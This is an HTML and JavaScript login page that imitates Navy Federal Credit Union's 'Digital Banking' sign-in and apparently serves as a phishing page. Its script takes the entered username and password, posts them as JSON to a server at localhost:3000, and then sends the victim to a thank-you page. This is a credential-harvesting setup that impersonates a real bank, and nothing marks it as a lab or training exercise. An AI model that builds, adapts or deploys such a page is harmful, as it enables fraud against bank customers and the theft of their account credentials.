<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"> -->

    <title>Login Form</title>
    <style>
        /* Example CSS styles */
        body {
            font-family: Arial, sans-serif;
            background-size: cover;
            background-repeat: no-repeat;
            background-position: center;
            background-image: url("assets/background.png");
        }
        h1{
            color: #0f3d70;
            font-family: Source Sans Pro Semibold;
            font-size: 2.375rem;
            line-height: 1.45;
            margin-top: 80px;
            margin-bottom: .5rem;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .button{
            background-color: #4CAF50;
            color: white;
            padding: 14px 20px;
            margin: 8px 0;
            border: none;
            cursor: pointer;
            width: 100%;
            opacity: 0.9;
        }
        .title{
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .mainImg{
            display: flex;
          padding-bottom: 1rem;
            margin: auto;
            border-radius: 0.5rem 0.5rem;
        }
        input[type="text"],
        input[type="password"],
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            margin-top: 8px;
            margin-bottom: 16px;
            display: inline-block;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }

         /* Responsive Styles */
        @media (max-width: 768px) {
           .container {
                padding: 15px;
            }
           .button {
                padding: 12px 18px;
            }
            h1 {
                font-size: 1.875rem;
                margin-top: 60px;
            }
        }

        @media (max-width: 480px) {
           .container {
                padding: 10px;
            }
           .button {
                padding: 10px 16px;
            }
            h1 {
                font-size: 1.5rem;
                margin-top: 50px;
            }
        }
        /* General rule for all images */
img {
    max-width: 100%; /* Ensures the image does not overflow its container */
    height: auto; /* Maintains the aspect ratio */
}

/* Responsive adjustments for smaller screens */
@media only screen and (max-width: 768px) {
    img.mainImg {
        width: 150px; /* Adjusts the main image size for tablets */
    }
}

@media only screen and (max-width: 480px) {
    img {
        width: 100%; /* Makes all images take full width on very small screens */
    }
}

    </style>
</head>
<body>


    <img src="assets/nfcu.jpg">
    <h1 class="title">Welcome to Digital Banking</h1>
    <div class="container">
        <img class="mainImg" src="assets/navy.jpg" alt="Navy Federal Credit Union Logo" width="200">
        <!-- <form action="process_login.php" method="post"> -->
            <form id="loginForm" method="post">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>

            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>

           <!-- <button class="button" type="submit">Submit</button> -->
               <button class="button" type="submit">Login</button>

        </form>

        <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

        const formData = new FormData(this);
        const username = formData.get('username');
        const password = formData.get('password');

        console.log({username, password});



         fetch('http://localhost:3000/login ', {
            method: 'POST',
            //  mode: 'no-cors', 
            headers: {
            'Content-Type': 'application/json'
            },
            body: JSON.stringify({ username, password })
        })
        .then(response => response.text())
        //  .then(data => console.log(data))
        .then(data => {
                if (data === 'Form data submitted successfully') {
                    window.location.href = ' http://localhost:3000/thank-you.html';
                } else {
                    alert('Submission failed. Please try again.');
                    // document.getElementById('loadingIcon').style.display = 'none';
                }
            })
        .catch(error => console.error('Error:', error));
        });
</script>
    </div>
</body>
</html>
